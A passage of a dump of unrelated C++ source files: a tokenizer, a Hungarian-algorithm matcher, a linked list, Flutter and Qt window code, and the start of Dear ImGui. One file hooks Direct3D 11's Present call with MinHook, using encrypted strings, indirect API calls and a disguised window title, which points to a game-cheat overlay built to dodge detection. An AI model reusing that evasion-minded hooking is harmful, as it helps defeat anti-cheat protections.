applyAsNormalString(atoll);\r\n\t}\r\n\r\n\tinline double toDouble() const\r\n\t{\r\n\t\treturn applyAsNormalString(atof);\r\n\t}\r\n};\r\n\r\ninline static void todo(const char* str)\r\n{\r\n\tstd::cout << \"TODO: \" << str;\r\n\tabort();\r\n}\r\n\r\nnamespace tokenKinds\r\n{\r\n\tconstexpr uint8_t\r\n\t\tnumber = 0,\r\n\t\talpha = 1,\r\n\t\tsolo = 2,\r\n\t\tstring = 3;\r\n\r\n\tconst char* names[] = {\r\n\t\t\"number\",\r\n\t\t\"alpha\",\r\n\t\t\"solo\",\r\n\t\t\"\\033[32mstring\"\r\n\t};\r\n}\r\n\r\nstruct Token\r\n{\r\n\tString str;\r\n\tuint8_t kind;\r\n\r\n\tinline void print() const\r\n\t{\r\n\t\tstd::cout << tokenKinds::names[kind] << \"\\033[0m\\t'\\033[36m\";\r\n\r\n\t\tstr.print();\r\n\r\n\t\tstd::cout << \"\\033[0m'\\n\";\r\n\t}\r\n};\r\n\r\nint main()\r\n{\r\n\tstd::vector<Token> tokens;\r\n\r\n\tstd::ifstream file(\"test.jiw\");\r\n\tassert(file.is_open());\r\n\r\n\tfile.seekg(0, std::ios::end);\r\n\tsize_t fileSize = file.tellg();\r\n\tfile.seekg(0, std::ios::beg);\r\n\r\n\tchar* buffer = (char*)malloc(fileSize);\r\n\tassert(buffer != nullptr);\r\n\r\n\tfile.read(buffer, fileSize);\r\n\tfile.close();\r\n\r\n\tuint8_t kind;\r\n\tchar* end = nullptr;\r\n\tfor (char* c = buffer; *c != '\\0';)\r\n\t{\r\n\t\tif (isspace(*c))\r\n\t\t{\r\n\t\t\tc++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\telse if (isdigit(*c))\r\n\t\t{\r\n\t\t\tend = findFirstNot(c + 1, isdigit);\r\n\t\t\tkind = tokenKinds::number;\r\n\t\t}\r\n\t\telse if (isalpha(*c))\r\n\t\t{\r\n\t\t\tend = findFirstNot(c + 1, isalnum);\r\n\t\t\tkind = tokenKinds::alpha;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tif (*c == '/')\r\n\t\t\t{\r\n\t\t\t\tif (c[1] == '/')\r\n\t\t\t\t{\r\n\t\t\t\t\tc = findFirst(c + 2, '\\n') + 1;\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t\telse if (c[1] == '*')\r\n\t\t\t\t{\r\n\t\t\t\t\tc++;\r\n\t\t\t\t\twhile (true)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tc = findFirst(c + 1, '*');\r\n\t\t\t\t\t\tif (c[1] == '/')\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tc += 2;\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\ttokens.push_back({ { c, 1 }, tokenKinds::solo });\r\n\r\n\t\t\tif (*c == '\"')\r\n\t\t\t{\r\n\t\t\t\tend = findFirst(++c, '\"');\r\n\t\t\t\ttokens.push_back({ { c, static_cast<uint16_t>(end - c) }, tokenKinds::string });\r\n\t\t\t\ttokens.push_back({ { c = end, 1 }, tokenKinds::solo });\r\n\t\t\t}\r\n\r\n\t\t\tc++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\r\n\t\ttokens.push_back({ { c, static_cast<uint16_t>(end - c) }, kind });\r\n\t\tc = end;\r\n\t}\r\n\r\n\tfor (Token& token : tokens)\r\n\t{\r\n\t\ttoken.print();\r\n\t}\r\n}",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "//\n// Created by zss on 2024/3/14.\n//\n\n#include \"HungarianAlgorithm.h\"\n\nvector<pair<int, int>> HungarianAlgorithm::getMatchedRobotAndTarget() {\n    vector<pair<int, int>> ans;\n    for (auto& [rid, gid] : m_matchedRobot2Good) {\n        ans.emplace_back(rid, gid);\n    }\n    return ans;\n}\n\nvoid HungarianAlgorithm::init(const vector<tuple<double, int, int>>& tuplesWeightRobotTarget) {\n\n    // \u5efa\u7acb\u673a\u5668\u4eba\u4e0e\u8d27\u7269 \u5230 \u5185\u90e8\u4e0b\u6807 \u7684\u6620\u5c04\n    for (auto& [w, rid, gid] : tuplesWeightRobotTarget) {\n        if (!m_rid2idx.count(rid)) {\n            m_rid2idx[rid] = m_rid2idx.size();\n            m_idx2rid[m_idx2rid.size()] = rid;\n        }\n        if (!m_tid2idx.count(gid)) {\n            m_tid2idx[gid] = m_tid2idx.size();\n            m_idx2tid[m_idx2tid.size()] = gid;\n        }\n    }\n\n    m_numRobots = m_idx2rid.size();\n    m_numTargets = m_idx2tid.size();\n    m_maxNum = max(m_numRobots, m_numTargets);\n    m_INF = 1000000007.f;\n    m_sum = 0;\n    m_weights = vector<vector<double>>(m_maxNum, vector<double>(m_maxNum));\n    m_matchRobots = vector<int>(m_maxNum, -1);\n    m_matchTargets = vector<int>(m_maxNum, -1);\n    m_pre = vector<int>(m_maxNum);\n    m_visitedRobots = vector<bool>(m_maxNum);\n    m_visitedTargets = vector<bool>(m_maxNum);\n    m_lx = vector<double>(m_maxNum, -m_INF);\n    m_ly = vector<double>(m_maxNum);\n    m_slack = vector<double>(m_maxNum);\n\n    // \u6dfb\u52a0\u8fb9\u6743\n    for (auto& [w, rid, gid] : tuplesWeightRobotTarget) {\n        addEdge(m_rid2idx[rid], m_tid2idx[gid], w);\n    }\n\n}\n\nvoid HungarianAlgorithm::execute() {\n\n    for (int i = 0; i < m_maxNum; ++i) {\n        for (int j = 0; j < m_maxNum; ++j) {\n            m_lx[i] = max(m_lx[i], m_weights[i][j]);\n        }\n    }\n\n    for (int i = 0; i < m_maxNum; ++i) {\n        fill(m_slack.begin(), m_slack.end(), m_INF);\n        fill(m_visitedRobots.begin(), m_visitedRobots.end(), false);\n        fill(m_visitedTargets.begin(), m_visitedTargets.end(), false);\n        bfs(i);\n    }\n\n    for (int i = 0; i < m_maxNum; ++i) {\n        if (m_weights[i][m_matchRobots[i]] > 0) {\n            m_sum += m_weights[i][m_matchRobots[i]];\n        } else {\n            m_matchRobots[i] = -1;\n        }\n    }\n    for (int i = 0; i < m_numRobots; ++i) {\n//            cout << m_matchRobots[i] + 1 << \" \";\n        if (m_matchRobots[i] == -1) continue;\n//        cout << m_idx2rid[i] << \" -> \" << m_idx2gid[m_matchRobots[i]] << endl;\n        m_matchedRobot2Good[m_idx2rid[i]] = m_idx2tid[m_matchRobots[i]];\n        m_matchedGood2Robot[m_idx2tid[m_matchRobots[i]]] = m_idx2rid[i];\n    }\n//    cout << \"\\m_maxNum\";\n\n//    if (m_numRobots != m_matchedRobot2Good.size()) {\n//        cerr << \"[HungarianAlgorithm]: \u8f93\u5165 \" << m_numRobots << \" \u4e2a\u673a\u5668\u4eba, \"\n//        << m_numTargets << \" \u4e2a\u76ee\u6807, \u6210\u529f\u914d\u5bf9 \"\n//        << m_matchedRobot2Good.size() << \" \u4e2a\u673a\u5668\u4eba.\" << endl;\n//    }\n\n//    cerr << \"[HungarianAlgorithm]: \u4f18\u5316\u5f97\u5230\u7684\u603b\u6743\u91cd\u4e3a \" << m_sum << endl;\n\n}\n\nvoid HungarianAlgorithm::addEdge(int x, int y, double weight) {\n    m_weights[x][y] = fmax(weight, 0.f);\n}\n\nbool HungarianAlgorithm::check(int x) {\n    m_visitedTargets[x] = true;\n    if (m_matchTargets[x] != -1) {\n        m_que.push(m_matchTargets[x]);\n        m_visitedRobots[m_matchTargets[x]] = true;\n        return false;\n    }\n    while (x != -1) {\n        m_matchTargets[x] = m_pre[x];\n        swap(x, m_matchRobots[m_pre[x]]);\n    }\n    return true;\n}\n\nvoid HungarianAlgorithm::bfs(int x) {\n    while (!m_que.empty()) {\n        m_que.pop();\n    }\n    m_que.push(x);\n    m_visitedRobots[x] = true;\n    while (true) {\n        while (!m_que.empty()) {\n            int u = m_que.front();\n            m_que.pop();\n            for (int v = 0; v < m_maxNum; ++v) {\n                if (!m_visitedTargets[v]) {\n                    double delta = m_lx[u] + m_ly[v] - m_weights[u][v];\n                    if (m_slack[v] >= delta) {\n                        m_pre[v] = u;\n                        if (delta) {\n                            m_slack[v] = delta;\n                        } else if (check(v)) {\n                            return;\n                        }\n                    }\n                }\n            }\n        }\n        double cost = m_INF;\n        for (int i = 0; i < m_maxNum; ++i) {\n            if (!m_visitedTargets[i]) {\n                cost = min(cost, m_slack[i]);\n            }\n        }\n        for (int i = 0; i < m_maxNum; ++i) {\n            if (m_visitedRobots[i]) {\n                m_lx[i] -= cost;\n            }\n            if (m_visitedTargets[i]) {\n                m_ly[i] += cost;\n            } else {\n                m_slack[i] -= cost;\n            }\n        }\n        for (int i = 0; i < m_maxNum; ++i) {\n            if (!m_visitedTargets[i] && m_slack[i] == 0 && check(i)) {\n                return;\n            }\n        }\n    }\n}",
    "#include<iostream>\nusing namespace std;\n\nclass SinglyCircularLinkedList{\nprivate:\n    class Node{\n    public:\n        int Data;\n        Node* Next;\n    };\n\n    Node *Head;\n    Node *Tail;\n    int Length;\n\npublic:    \n    SinglyCircularLinkedList(){\n        Head = Tail = NULL;\n        Length = 0;\n    }\n\n    void insertFirst(int element){\n        Node *newNode = new Node;  \n        newNode->Data = element; \n        if (Head == NULL){\n            Head = newNode;\n            Tail = newNode; // Update Tail to point to the new node\n            newNode->Next = Head;\n        } else {\n            newNode->Next = Head;\n            Tail->Next = newNode;\n            Head = newNode;\n        }\n        Length++;\n    }\n\n    void insertLast(int element){\n\n        Node *newNode = new Node;  \n        newNode->Data = element; \n        if (Head == NULL){\n            Head = newNode;\n            Tail = newNode; // Update Tail to point to the new node\n            newNode->Next = Head;\n        } else {\n            newNode->Next = Head;\n            Tail->Next = newNode;\n            Tail = newNode;\n        }\n        Length++;\n    }\n\n    void insertAtPos(int element, int Pos){\n        if (Pos == 0){\n            insertFirst(element);\n        } else if (Pos == Length) {\n            insertLast(element);\n        } else if (Pos > Length){\n            cout << \"Position out of range\" << endl;\n        } else {\n            Pos--; // Adjusting position to match zero-based indexing\n            Node *newNode = new Node;\n            newNode->Data = element;\n\n            Node *Temp = Head;\n            while (Pos--) { // Change to while (Pos--) to decrement Pos once per iteration\n                Temp = Temp->Next;\n            }\n            newNode->Next = Temp->Next;\n            Temp->Next = newNode;\n\n            Length++;\n        }         \n    }\n\n    void removeFirst() {\n        if (Head == NULL) {\n            cout << \"The list is already empty\\n\";\n        } else if (Head == Tail) {\n            delete Head;\n            Head = Tail = NULL;\n            Length--;\n        } else {\n            Tail->Next = Head->Next;\n            delete Head;\n            Head = Tail->Next;\n\n            Length--;\n        }\n    }\n\n    void removeLast(){\n        if (Tail == NULL){\n            cout << \"The list is already empty\\n\";\n        } else if (Tail == Head){\n            delete Tail;\n            Tail = Head = NULL;\n            Length--;\n        } else {\n            Node *Temp = Head;\n            while (Temp->Next != Tail){\n                Temp = Temp->Next;\n            }\n\n            delete Tail;\n            Tail = Temp;\n            Tail->Next = Head; // Update the new last node's Next pointer to point to Head\n\n            Length--;\n        }\n    }\n    \n        void removeAtPos(int Pos){\n        if (Pos == 0){\n            removeFirst();\n        } else if (Pos == Length - 1) {\n            removeLast();\n        } else if (Pos >= Length){\n            cout << \"Position out of range\" << endl;\n        } else {\n            Pos--; // Adjusting position to match zero-based indexing\n\n            Node *Temp = Head;\n            while (Pos--) { // Change to while (Pos--) to decrement Pos once per iteration\n                Temp = Temp->Next;\n            }\n            Node *ToDelete = Temp->Next;\n            Temp->Next = Temp->Next->Next;\n            delete ToDelete;\n            Length--;\n        }        \n    }\n\n    int getLength() {\n        if (Head == NULL) {\n            return 0; // Empty list\n        }\n\n        int len = 0;\n        Node *currentNode = Head;\n        do {\n            len++;\n            currentNode = currentNode->Next;\n        } while (currentNode != Head);\n\n        return len;\n    }\n\n    void atPos(int Pos){\n        if (Pos == 0){\n            cout << Head->Data << endl; \n        } else if (Pos == this->getLength()) {\n            cout << Tail->Data << endl;\n        } else if (Pos >= this->getLength()) {\n            cout << \"Position out of range\" << endl;\n        } else {\n            Node *Temp = Head;\n            while (Pos--) {\n                Temp = Temp->Next;\n            }\n            cout << Temp->Data << endl;\n        }\n    }\n\n    int find(int element){\n        Node *Temp = Head;\n        int index = 0;\n        do {\n            if (Temp->Data == element) {\n                return index; \n            }\n            Temp = Temp->Next;\n            index++;\n        } while (Temp != Head); // Loop until we reach the Head again, completing a full traversal\n        return -1;\n    }\n\n    void reverse() {\n        int len = getLength();\n        if (len == 0) {\n            cout << \"Empty list\" << endl;\n        } else if (len == 1) {\n            cout << \"List has only one element (Already reversed)\" << endl;\n        } else {\n            Node *current = Head;\n            Node *pre = NULL;\n            Node *next = NULL;\n            while (current != NULL) {\n                next = current->Next;\n                current->Next = pre;\n                pre = current;\n           ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <string>\n#include <filesystem>\n#include <vector>\n#include <thread>\n#include <chrono>\n#include <ctime>\nusing namespace std;\nint num = 0;\nbool active = true;\nstring sword = \"your file\";\nstring path = \"your searching path\";\nfloat timeout = 666.0;\nvector<string> exceptions = {\"sys\", \".speech-dispatcher\", \".wine\", \"llvm-14\", \"proc\", \"X11\", \"steam\", \"z:\"};\nvector<string> results;\nvoid checker(){\n    float timet = 0;\n    while(active){\n        this_thread::sleep_for(0.1s);\n        timet += 0.1;\n        if(timet >= timeout){\n            active = false;\n            break;\n        }\n    }\n}\nstring mlower(string str){\n    for(char & stabe : str){\n        stabe = tolower(stabe);\n    }\n    return str;\n}\nbool check_it(string inp, vector<string> inplist){\n    bool h = true;\n    for(string element : inplist){\n        if(mlower(element) == mlower(inp)){\n            return false;\n            h = false;\n            break;\n        }\n    }\n    if(h){return true;}\n}\nvector<string> split_str(string tos, char del){\n    vector<string> re;\n    string h;\n    for(auto& stabe : tos){\n        if(stabe != del){\n        h = h + stabe;}\n        else if(stabe == del){\n            re.push_back(h);\n            h = \"\";\n        }\n    }\n    if(tos[tos.size()] != del){\n        re.push_back(h);\n    }\n    return re;\n}\nstring wend(string str){\n    vector<string> sstr = split_str(str, '.');\n    return sstr[0];\n}\nvoid search_folder(string folder){\n    if(active){\n        try{\n    vector<string> files;\n    vector<string> folders;\n    for (const auto & entry : filesystem::directory_iterator(folder))\n        if(filesystem::is_regular_file(entry)){\n             files.push_back(entry.path().c_str());\n        }\n        else if(filesystem::is_directory(entry)){\n             folders.push_back(entry.path().c_str());\n        }     \n    for(string fpath : files){\n        vector<string> filename  = split_str(fpath, '/');\n        if(mlower(wend(filename[filename.size()-1])) == mlower(wend(sword))){\n            results.push_back(fpath);\n        }\n        num++;\n    }\n    for(string folder : folders){\n        vector<string> foldername = split_str(folder, '/');\n        if(mlower(foldername[foldername.size()-1]) == mlower(wend(sword))){\n            results.push_back(folder);\n            cout<<folder<<endl;}   \n        if(check_it(foldername[foldername.size()-1], exceptions)){\n        search_folder(folder);}\n        cout<<\"\\033[1;35m\"+folder+\"\\033[0m\"<<endl;\n    } }\n    catch(...){\n        ;\n    }}\n}\nint main(){\n    time_t start = time(nullptr);\n    thread t1 = thread(checker);\n    t1.detach();\n    thread t2 = thread(search_folder, path);\n    t2.join();\n    active = false;\n    cout<<\"\\n\\n\\n\\033[1;31mResults:\\033[0m\\n\";\n    for(const string element: results){\n        cout<<\"\\033[1;32m    \"+element+\"\\033[0m\"<<endl;\n    }\n    cout<<\"\\n\";\n    cout<<\"\\033[1;31mEnded searching \"+to_string(num)+\" files \"+to_string(time(nullptr)-start)+\"secs\\033[0m\\n\";\n}\n",
    "#define DEBUG_MODE 1\n#include \"program_defs.h\"\n\n#include \"mainwindow.h\"\n#include \"appsettings.h\"\n#include \"optmethods/optimizationobjectstorage.h\"\n\n#include <QApplication>\n#include <QTranslator>\n#include <QFile>\n\nint main(int argc, char *argv[])\n{\n    QApplication a(argc, argv);\n\n    // Loading settings from file, or creating it, if it does not exist\n    const QString settingsFileName = \"settings.txt\";\n    QFile settingsFile(settingsFileName);\n\n    DBG(\"Settings file exists: \" << settingsFile.exists());\n\n    AppSettings* settings;\n    if (settingsFile.exists())\n    {\n        settings = AppSettings::initializeFromFile(settingsFileName);\n        if (settings == nullptr)\n        {\n            DBG(\"App Settings was not loaded from file due to following error:\\n\");\n            DBG(AppSettings::lastError());\n            goto default_settings;\n        }\n        DBG(\"Loaded app settings from file \" << settingsFileName << \"\\n\");\n    }\n    else\n    {\ndefault_settings:\n        settings = AppSettings::get();\n        DBG(\"Loaded default app settings\\n\");\n    }\n\n    // Installing translations and applying other settings\n    QTranslator translator;\n    if (translator.load(TS_FILE(settings->takeByName(\"locale\")))) {\n        a.installTranslator(&translator);\n    }\n\n    OptimizationObjectStorage::init();\n\n    MainWindow w;\n\n    w.resize(settings->takeByName(\"resolutionX\").toInt(), settings->takeByName(\"resolutionY\").toInt());\n    if (settings->takeByName(\"maximized\").toInt()) w.showMaximized();\n    else w.show();\n\n\n    // Loading program\n    int returnCode = a.exec();\n\n    if (settingsFile.open(QFile::WriteOnly))\n    {\n        QByteArray stringRepr = QByteArray::fromStdString(settings->toString().toStdString());\n        settingsFile.write(stringRepr);\n        settingsFile.close();\n    }\n\n    return returnCode;\n}\n",
    "// dear imgui, v1.85 WIP\n// (main code and documentation)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' below for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for details, links and comments.\n\n// Resources:\n// - FAQ                   http://dearimgui.org/faq\n// - Homepage & latest     \n// ://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/4451 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n\n// Getting Started?\n// - For first-time users having issues compiling/linking/running or issues loading fonts:\n//   please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via invoiced technical support, maintenance and sponsoring contracts. Please reach out to \"contact AT dearimgui.com\".\n// Individuals: you can support continued development via donations. See docs/README or web page.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- END-USER GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE 